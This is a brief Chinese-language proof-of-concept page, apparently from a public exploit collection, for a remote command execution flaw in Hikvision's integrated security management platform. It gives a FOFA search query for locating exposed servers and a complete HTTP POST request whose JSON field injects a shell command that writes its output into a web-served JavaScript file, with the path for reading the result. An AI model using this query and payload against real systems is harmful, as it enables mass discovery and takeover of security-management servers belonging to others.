## 海康威视综合安防系统detection接口存在RCE漏洞

## fofa

```
app="HIKVISION-综合安防管理平台" ||app="HIKVISION-iSecure-Center"
```

## poc

```
POST /center/api/installation/detection;.js HTTP/1.1
Host: xx.xx.xx.xx
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 154

{"type":"environment",
"operate":"",
"machines":{"id":"$(find /|grep chunk-common.34c924fe.js|while read f;do sh -c id >$(dirname $f)/123.js;done)"}}
```

写入文件路径
`http://xx.xx.xx.xx/portal/ui/static/js/123.js`

<img width="1302" alt="image-20240307102647932" src="https://github.com/wy876/POC/assets/139549762/476f1181-d7e0-4485-862c-856a64317681">
